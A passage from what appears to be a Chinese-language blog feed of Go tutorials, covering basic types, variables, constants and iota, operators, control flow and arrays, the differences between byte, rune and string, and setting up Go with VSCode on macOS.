<code>math</code> 包中有 Max 和 Min开头的标识类型最大最小的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;math&quot;</span><br><span class="line">)</span><br><span class="line">....</span><br><span class="line">fmt.Println(math.MaxUint32)</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">4294967295</span><br></pre></td></tr></table></figure><h2 id="类型零值">类型零值</h2><p>零值并不等于空值，而是当变量被声明为某种类型后的默认值，通常情况下值类型的默认值为 0，bool 为 false，string 为空字符串</p><p>类型别名</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> (</span><br><span class="line">文本 <span class="type">string</span></span><br><span class="line"> )</span><br><span class="line">..</span><br><span class="line"><span class="keyword">var</span> chinese 文本 = <span class="string">&quot;中文&quot;</span></span><br><span class="line">fmt.Println(chinese)</span><br></pre></td></tr></table></figure><p>从严格意义上讲， type newInt int, 这里 newInt 并不能说是 int的别名，而只是底层数据结构相同，在这里称为自定义类型，<strong>在进行类型转换时仍旧需要显式转换</strong>，但 byte 和 rune 确确实实为 uint8 和 int32 的别名，可以相互进行转换。</p><h2 id="单个变量的声明与赋值">单个变量的声明与赋值</h2><ul><li>变量的声明格式：var <变量名称><变量类型></li><li>变量的赋值格式：<变量名称>=<表达式></li><li>声明的同时赋值：var <变量名称>[变量类型]=<表达式></li><li>声明的同时赋值最简形式：<变量名称> := <表达式> go编译器会根据赋的值进行类型推断, 而 <code>:</code> 相当于 var</li></ul><p>声明与赋值分开的形式应用场景：当你需要在分支结构中使用，但是在结束分支分支结构后，还需要使用它，那么就需要提前在外面声明。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span></span><br><span class="line">a = <span class="number">2</span> <span class="comment">//a = 1.1 是错误的，不能隐式转换</span></span><br><span class="line"><span class="keyword">var</span> b <span class="type">int</span> = <span class="number">3</span></span><br><span class="line"><span class="keyword">var</span> c = <span class="number">4</span>  <span class="comment">//因为 go编译器可以进行类型推断，因此声明同时赋值时，可以省略类型。</span></span><br><span class="line">d := <span class="literal">false</span> <span class="comment">//声明同时赋值 的最简形式， go 编译器会根据赋的值进行类型推断</span></span><br><span class="line">fmt.Println(a)</span><br><span class="line">fmt.Println(b)</span><br><span class="line">fmt.Println(c)</span><br><span class="line">fmt.Println(d)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多个变量的声明与赋值">多个变量的声明与赋值</h2><ul><li>全局变量的声明可使用 var() 的方式进行简写</li><li>全局变量的声明不可以省略 var，但可使用并行方式</li><li>所有变量都可以使用类型推断</li><li>var() 变量组可以在函数体内用于声明局部变量，感谢 Hubery指出，但并不建议这样使用。</li></ul><p>补充：使用空白符号 <code>_</code>对赋值进行忽略，在比如：接受函数多个返回值的场景及其有用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">var1, var2 = <span class="number">5</span>, <span class="number">6</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a, _, c, d := <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span></span><br><span class="line">fmt.Println(a)</span><br><span class="line">fmt.Println(c)</span><br><span class="line">fmt.Println(d)</span><br><span class="line">fmt.Println(d)</span><br><span class="line">fmt.Println(var1)</span><br><span class="line">fmt.Println(var2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="变量的类型转换">变量的类型转换</h2><ul><li>Go 中不存在隐式转换，所有类型转换必须显式声明</li><li>转换只能发生在两种相互兼容的类型之间（注:布尔类型与整型不兼容）</li><li>类型转换的格式： <ValueA> [:]= <TypeOfValueA>(<ValueB>)</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a := <span class="number">1.2</span></span><br><span class="line"><span class="keyword">var</span> b <span class="type">int</span> = <span class="type">int</span>(a)</span><br><span class="line">fmt.Println(a)</span><br><span class="line">fmt.Println(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果将数字转换为 string 会对应为 ascii 码中的字符，如果只想数字转换为字符串类型的数字，可以使用 "strconv" 包 中的 Itoa函数(当然， 也有 Atoi 起相反作用。)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;math&quot;</span></span><br><span class="line"><span class="string">&quot;reflect&quot;</span></span><br><span class="line"><span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span> = <span class="number">65</span></span><br><span class="line">b := <span class="type">string</span>(a)</span><br><span class="line">c := strconv.Itoa(a)</span><br><span class="line">fmt.Println(reflect.TypeOf(a))</span><br><span class="line">fmt.Println(reflect.TypeOf(c))</span><br><span class="line">fmt.Println(b)</span><br><span class="line">fmt.Println(c)</span><br></pre></td></tr></table></figure><p>OUTPUT: <code>int string A 65</code></p><h1 id="常量与运算符">常量与运算符</h1><h2 id="常量的定义">常量的定义</h2><ul><li><strong>常量的值在编译时就已经确定</strong></li><li>常量的定义格式与变量基本相同</li><li>等号右侧必须是常量或者常量表达式</li><li>常量表达式中的函数必须是内置函数</li><li>常量一般使用全大写字母，像星期 等大家都熟知的可以使用固定写法如果你想要常量不暴露给外部</li></ul><h2 id="常量的初始化规则与枚举">常量的初始化规则与枚举</h2><ul><li>在定义常量组时，如果不提供初始值，则表示将使用<strong>上行的表达式</strong><strong>注意：使用相同的表达式不代表具有相同的值</strong></li><li>使用上一行的表达式时，注意：第一行不能使用，因为第一行没有上一行emm</li><li>使用上一行表达式时， 常量个数需要对应, 比如：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span>(</span><br><span class="line">    var1, var2 = <span class="number">1</span>, <span class="string">&quot;f&quot;</span></span><br><span class="line">    var3, var4</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>常量可以单个声明赋值，也可以并行，常量组声明赋值。</li><li>全局变量不是常量，不能用于初始化常量。</li></ul><h3 id="itoa">itoa</h3><p>iota 是 golang 语言的常量计数器,只能在常量的表达式中使用。</p><p>iota 在 const 关键字出现时将被重置为 0(const内部的第一行之前)，<strong>const常量组</strong>中每<strong>新增一行常量声明</strong>将使 iota计数一次(iota 可理解为 const 常量组中的行索引)， 注意：iota在常量组中自动计数，与你使不使用无关。</p><p>使用 iota 能简化定义，通过初始化规则与 iota 可以达到枚举的效果每遇到一个 const 关键字，iota 就会重置为 0</p><p>举例如下：</p><ol type="1"><li><p>iota 只能在常量的表达式中使用。 <code>fmt.Println(iota)</code>编译错误： undefined: iota</p></li><li><p>每次 const 出现时，都会让 iota 初始化为 0.<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="literal">iota</span> <span class="comment">// a=0</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">  b = <span class="literal">iota</span>     <span class="comment">//b=0</span></span><br><span class="line">  c            <span class="comment">//c=1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p></li><li><p>使用 iota 模拟计算机的存储单位增加</p></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">B <span class="type">float64</span> = <span class="number">1</span> &lt;&lt; (<span class="number">10</span> * <span class="literal">iota</span>)</span><br><span class="line">KB</span><br><span class="line">MB</span><br><span class="line">GB</span><br><span class="line">TB</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>3、自定义类型</p><p>自增长常量经常包含一个自定义枚举类型，允许你依靠编译器完成自增设置。</p><p>type Stereotype int</p><p>const ( TypicalNoob Stereotype = iota // 0 TypicalHipster // 1TypicalUnixWizard // 2 TypicalStartupFounder // 3 )</p><h2 id="运算符">运算符</h2><p>Go 中的运算符均是从左至右结合</p><p>优先级（从高到低）</p><p>-<code>^      !</code> （一元运算符）</p><ul><li><code>*       /    %    &lt;&lt;    &gt;&gt;    &amp;      &amp;^</code></li><li><code>+      -     |      ^</code> （二元运算符）</li><li><code>==   !=   &lt;    &lt;=    &gt;=    &gt;</code></li><li><code>&lt;-</code> （专门用于 channel）</li><li><code>&amp;&amp;</code></li><li><code>||</code></li></ul><p>两个 <code>^</code>的区别：</p><ol type="1"><li>当 <code>^</code> 和一个运算数在一起时，为一元运算符</li><li>一元运算符优先级高于二元运算符</li></ol><p>二元位运算操作符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">6: 0110</span><br><span class="line">11: 1011</span><br><span class="line">----------</span><br><span class="line">&amp; : 0010 = 2按位与</span><br><span class="line">| : 1111 = 15按位或</span><br><span class="line">^ : 1101 = 13按位异或</span><br><span class="line">&amp;^: 0100 = 4按位置零</span><br></pre></td></tr></table></figure><p><code>&amp;&amp;</code> ：逻辑与, 具有短路作用，可以通过判断前面条件是否满足， 来决定是否执行后面的操作。<code>||</code> :逻辑或，也有短路作用</p><h1 id="判断语句-if">判断语句 if</h1><ul><li>条件表达式没有括号</li><li>支持一个初始化表达式（可以是并行方式）</li><li>左大括号必须和条件语句或 else 在同一行</li><li>支持单行模式</li><li>初始化语句中的变量为 block级别，同时隐藏外部同名变量（即：同名的局部变量与全局变量在局部会隐藏全局变量）</li></ul><p>注意：初始化表达式之间用分号分割。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> a, b := <span class="number">1</span>, <span class="number">2</span>; a &lt; <span class="number">2</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="循环语句-for">循环语句 for</h1><ul><li>Go 只有 for 一个循环语句关键字，但支持 3 种形式</li><li>初始化和步进表达式可以是多个值</li><li>条件语句每次循环都会被重新执行、检查，因此，不建议在条件语句中使用函数，尽量提前计算好条件并以变量和常量代替。比如：字符串比较与 len(str1) 的大小时， 可以先在外面求出 len的值来，然后放到 i &lt; str_len 那里， 就不用每次循环算了。</li><li>左大括号必须和条件语句在同一行使用。</li></ul><p>三种形式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a := <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">a++</span><br><span class="line"><span class="keyword">if</span> a &gt; <span class="number">3</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(a)</span><br><span class="line">fmt.Println(<span class="string">&quot;---------&quot;</span>)</span><br><span class="line"></span><br><span class="line">b := <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> b &lt; <span class="number">3</span> &#123;</span><br><span class="line">b++</span><br><span class="line">fmt.Println(b)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;---------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Here&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">3</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="选择语句-switch">选择语句 switch</h1><ul><li>可以使用任何类型或表达式作为条件语句</li><li>不需要写 break，一旦条件符合自动终止</li><li>如希望继续执行下一个 case，需使用 fallthrough 语句</li><li>支持一个<strong>初始化表达式（可以是并行方式），右侧需跟分号</strong></li><li>左大括号必须和条件语句在同一行 <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200308152347301_1869586488.png" /></li></ul><h1 id="跳转语句-goto-break-continue">跳转语句 goto, break,continue</h1><ul><li>三个语法都可以配合标签使用</li><li>标签名区分大小写，若不使用会造成编译错误</li><li>break 与 continue 配合标签可用于多层循环的跳出, break， continue如果不跟标签的话，就是只针对内层循环 <code>break LABEL1</code>，则针对与 LABEL1 同级循环进行 break， 即：break 到与 LABEL1同级的循环的外面。 <code>continue LABEL1</code>, 则针对与 LABEL1同级循环进行 continue， 即：跳过本轮循环，去执行和 LABEL1同级的循环</li><li>goto 是调整执行位置，与其它 2 个语句配合标签的结果并不相同</li></ul><h1 id="数组">数组</h1><ul><li>定义数组格式：<code>var &lt;varName&gt; [n]type</code>(n &gt;0)</li><li>数组的长度也是类型的一部分，因此具有不同长度的数组为不同类型。</li><li>注意：区分指向数组的指针与指针数组</li><li><strong>数组在 Go 中为值类型</strong></li><li>数组之间可以使用 <code>==</code> 或 <code>！=</code>进行比较，但不可以使用 <code>&lt;</code> 或 <code>&gt;</code></li><li>可以使用 <code>new</code>来创建数组，词方法返回一个指向数组的指针。</li><li>Go 支持多维数组</li></ul><p>当你想在声明数组时，初始化数组的话，可以采用以下方式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a := [2]int&#123;1, 2&#125; 声明并赋值</span></span><br><span class="line"><span class="comment">// a := [...]int&#123;1,2,3&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//var a [2]int</span></span><br><span class="line">a := [<span class="number">2</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">fmt.Println(a)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">fmt.Println(a[i])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Go 中的 byte、rune 与 string</title>
      <link href="/blog/2022/10/16/programming/go/go_string/"/>
      <url>/blog/2022/10/16/programming/go/go_string/</url>
      
        <content type="html"><![CDATA[<h2 id="byte-和-rune">byte 和 rune</h2><p>byte 是 uint8 的别名，其字面量是 8 位整数值，byte 切片相比于不可变的string方便常用许多。它可以更改每个字节或字符。这对于处理文件内容(无论是文本文件、二进制文件还是来自网络的I/O 流)非常有效。byte 切片是一个可变的字节序列</p><p>rune 是 int32 的别名,其字面量是 32 位整数值，用来表示 Unicode字符编码。rune 类似于 byte，不同点在于 rune每个索引是一个字符而不是一个字节。rune切片是对字节片的重新分组使得每个索引都是一个字符。</p><p>如果你处理的文本文件有很多非 ascii字符，比如中文文本、数学公式或带有表情符号的文本，使用 rune是最好的。</p><p>rune 也是从字符串中获取子字符串的理想选择。它支持 Unicode字符，没有数据损坏的风险。</p><p>对于 []rune，len()和索引都是基于 rune（int32）的。 当你将 []rune转换为 string 时，每个 rune 成为字符串中的一个 utf-8 字符。</p><h2 id="byte-和-rune-的区别">byte 和 rune 的区别</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">func main() &#123;</span><br><span class="line">s := &quot;GÖ&quot;</span><br><span class="line">sample := &quot;H哈&quot;</span><br><span class="line"></span><br><span class="line">sByte := []byte(s)</span><br><span class="line">sRune := []rune(s)</span><br><span class="line">sampleByte := []byte(sample)</span><br><span class="line">sampleRune := []rune(sample)</span><br><span class="line"></span><br><span class="line">fmt.Printf(&quot;%s\nsByte: %d\nsRune: %d\n&quot;, s, sByte, sRune)</span><br><span class="line">fmt.Println(&quot;------&quot;)</span><br><span class="line">fmt.Printf(&quot;%s\nsampleByte: %d\nsampleRune: %d\n&quot;, sample, sampleByte, sampleRune)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 rune 中非 ASCII 码字符的 Unicode 编码为 1-3 字节，与 ASCII码字符的字节数不一定相同。</p><h2 id="string">string</h2><p>string 是不可变的 byte 切片。因为 Go 中的源代码使用 utf-8编码，因此每个字符串也使用 utf-8 编码，即 string 字面量是 utf-8 编码，以byte 为单位的。string 中的每个字符实际占用 1-3 个字节，而每个 rune 占 4个字节。</p><ul><li>使用 rune() 可把 byte 为单位的字符转换为 rune 字符，对于 ASCII字符来说，rune 值和 byte 值相同，而对于 Unicode编码的字符来说便不同了。</li><li>使用 []rune() 将 string 转换 rune 数组。当将字符串转换为 rune切片时，字符串中的每个 utf-8 字符被转换为一个 rune，从而获得包含字符串Unicode 编码字符的新切片。</li><li>对于 string，len()和索引都是基于 byte（unint8）的</li><li>在 Go 中将字符串转换为 rune 切片是一个标准操作，没有数据损坏的风险。字符串是处理短字节或字符序列比较好的方法。每次对字符串进行操作(例如查找替换字符串或接受子字符串)时，都会创建一个新的字符串。如果字符串非常大，例如文件内容，则效率非常低。</li></ul><h3 id="string-中索引字符">string 中索引字符</h3><p>例如我们先看下面程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">sample := &quot;Hel哈&quot;</span><br><span class="line">for i := 0; i &lt; len(sample); i++ &#123;</span><br><span class="line">fmt.Print(sample[i], &quot; &quot;)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println()</span><br><span class="line">fmt.Printf(&quot;%s\t的字节长度: %d\n&quot;, sample, len(sample))</span><br><span class="line">fmt.Printf(&quot;哈\t字符的字节长度: %d\n&quot;, utf8.RuneLen(&#x27;哈&#x27;))</span><br><span class="line">fmt.Printf(&quot;%s\t的字符长度: %d\n&quot;, sample, utf8.RuneCountInString(sample))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">72 101 108 229 147 136</span><br><span class="line">Hel哈   的字节长度: 6</span><br><span class="line">哈      字符的字节长度: 3</span><br><span class="line">Hel哈   的字符长度: 4</span><br></pre></td></tr></table></figure><p>可以看出字符串的长度(len)和字符串的字符长度（RuneCountInString）是不同的。因为字符串是字节切片，Go默认 UTF-8，存储非 ASCII 字符时，每个字符则会存储 1-3个字节。所以想要正确地索引字符串中的字符有以下两种方法：</p><ol type="1"><li>将字符串转换为 rune 切片</li><li>使用 range 操作符迭代 Unicode 字符 也就是说对字符串进行 rang迭代，是字符迭代，而不是字节迭代。</li></ol><h2 id="关于编码的一些方法">关于编码的一些方法</h2><p><code>utf8.ValidRune(chr)</code>： 判断 chr 是否可以编码为合法的utf-8 序列。 <code>utf8.RuneLen(chr)</code>： 查看字符 chr 的字节长度<code>utf8.RuneCount()</code>： 查看字节数组中按照 rune 单位的字符长度<code>utf8.RuneCountInString</code>： 查看字符串按照 rune 单位的长度</p><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://appdividend.com/2020/03/12/golang-how-to-convert-string-to-rune-in-go-example/">Golang:How To Convert String To Rune in Go Example</a></li><li><ahref="https://stackoverflow.com/questions/19310700/what-is-a-rune">go -What is a rune? - Stack Overflow</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>macOS VSCode 配置 Go 编程环境</title>
      <link href="/blog/2022/10/16/programming/go/macos_golang/"/>
      <url>/blog/2022/10/16/programming/go/macos_golang/</url>
      
        <content type="html"><![CDATA[<p>笔者使用 macOS BigSur 安装完 Go 1.16.6 和 VSCode Go插件，然后运行时，往往会报诸如下面的错误：</p><blockquote><p>build esc: cannot load xxx : malformed module path “xxx”: missing dotin first path element</p></blockquote><blockquote><p>warning: GOPATH set to GOROOT (/Users/xxx/go/) has no effect</p></blockquote><p>实际上，这都是由于 GOPATH 和 GOROOT这两个关键参数配置错误造成的。至于这两个参数是什么含义，可以看我之前的博文：GOROOT、GOPATH以及 Go 相关命令。</p><p>下面我将从 macOS 安装 go 开始来讲解配置流程：</p><ol type="1"><li>首先，我们建立在使用 brew 安装 go 的前提下<code>brew install go</code></li><li>查看环境变量 在终端输入以下命令查看对应环境变量<code>go env GOPATH</code> 查看 GOPATH <code>go env GOROOT</code> 查看GOROOT 例如我的两个： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ go env GOPATH</span><br><span class="line">/Users/realyee/go</span><br><span class="line">$ go env GOROOT</span><br><span class="line">/usr/local/Cellar/go/1.16.6/libexec</span><br></pre></td></tr></table></figure></li><li>在<code>~/.bash_profile</code>或者<code>~/.bashrc</code>（如果你使用zsh，则在<code>~/.zshrc</code>）中加入命令如下,<strong>下面的 GOPATH 和GOROOT 都以我自己的为例，请对应修改</strong>： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export GOPATH=/Users/realyee/go</span><br><span class="line">export GOROOT=/usr/local/Cellar/go/1.16.6/libexec</span><br><span class="line">export PATH=$PATH:$GOPATH/bin</span><br><span class="line">export PATH=$PATH:$GOROOT/bin</span><br></pre></td></tr></table></figure></li><li>在当前 shell 生效<code>source ~/.bash_profile</code>或<code>source ~/.zshrc</code></li></ol><p>注意:在 macOS 上安装完 VSCode 之后，终端默认没有配置 code命令，可以打开 Command Palette（Cmd+Shift+P），输入 shell command，将code 命令安装到终端</p><h2 id="配置-vscode-设置">配置 VSCode 设置</h2><p>如果你用 VSCode 来进行 Go 编程，并且希望通过它进行 Debug调试，安装如下插件： <ahref="https://marketplace.visualstudio.com/items?itemName=golang.Go">Go- Visual Studio Marketplace</a></p><p>打开 VSCode 的setting.json（直接去目录找<code>~/Library/Application Support/Code/User/settings.json</code>也可）加入go 相关配置：</p><p><strong>注意</strong>：</p><ol type="1"><li>前两行中的 GOPATH 和 GOROOT 都以我自己的为例，请对应修改</li><li>注意修改第三行 HTTP 代理的端口，方便翻墙下载 go 工具</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&quot;go.gopath&quot;: &quot;/Users/realyee/go&quot;,</span><br><span class="line">&quot;go.goroot&quot;: &quot;/usr/local/Cellar/go/1.16.6/libexec&quot;,</span><br><span class="line">&quot;http.proxy&quot;: &quot;http://127.0.0.1:7890&quot;,</span><br><span class="line">// Run Lint tool on save.</span><br><span class="line">&quot;go.lintOnSave&quot;: &quot;file&quot;, //在保存代码时自动检查代码可以优化的地方，并给出建议</span><br><span class="line">&quot;go.formatTool&quot;: &quot;gofmt&quot;, //使用 goimports 工具进行代码格式化，或者使用 goreturns 和 gofmt</span><br><span class="line">&quot;go.docsTool&quot;: &quot;gogetdoc&quot;,</span><br><span class="line">&quot;go.autocompleteUnimportedPackages&quot;: true,</span><br><span class="line">// Specifies Lint tool name.</span><br><span class="line">&quot;go.lintTool&quot;: &quot;golint&quot;,</span><br><span class="line">// Flags to pass to Lint tool (e.g. [&quot;-min_confidence=.8&quot;])</span><br><span class="line">&quot;go.lintFlags&quot;: [],</span><br><span class="line">&quot;go.coverOnSave&quot;: false, //在保存代码时执行测试，并显示测试覆盖率</span><br><span class="line">&quot;go.useCodeSnippetsOnFunctionSuggest&quot;: true, //使用代码片段作为提示</span><br><span class="line">&quot;go.gocodeAutoBuild&quot;: false, //代码自动编译构建</span><br><span class="line">&quot;cSpell.enableFiletypes&quot;: [</span><br><span class="line">    &quot;go.mod&quot;,</span><br><span class="line">    &quot;go.sum&quot;</span><br><span class="line">],</span><br><span class="line">&quot;[go]&quot;: &#123;</span><br><span class="line">    &quot;editor.insertSpaces&quot;: false,</span><br><span class="line">    &quot;editor.formatOnSave&quot;: true,</span><br><span class="line">    &quot;editor.codeActionsOnSave&quot;: &#123;</span><br><span class="line">        &quot;source.organizeImports&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;editor.suggest.snippetsPreventQuickSuggestions&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后打开 Command Palette（Cmd+Shift+P），输入 go:install，点击选择Go:Install/Update Tools，全选所有工具进行安装。最后在项目目录的 .vscode目录的 launch.json 中添加如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;Launch Package&quot;,</span><br><span class="line">&quot;type&quot;: &quot;go&quot;,</span><br><span class="line">&quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">&quot;mode&quot;: &quot;debug&quot;,</span><br><span class="line">&quot;program&quot;: &quot;$&#123;workspaceFolder&#125;&quot;,</span><br><span class="line">&quot;args&quot;:[&quot;serve&quot;]</span><br><span 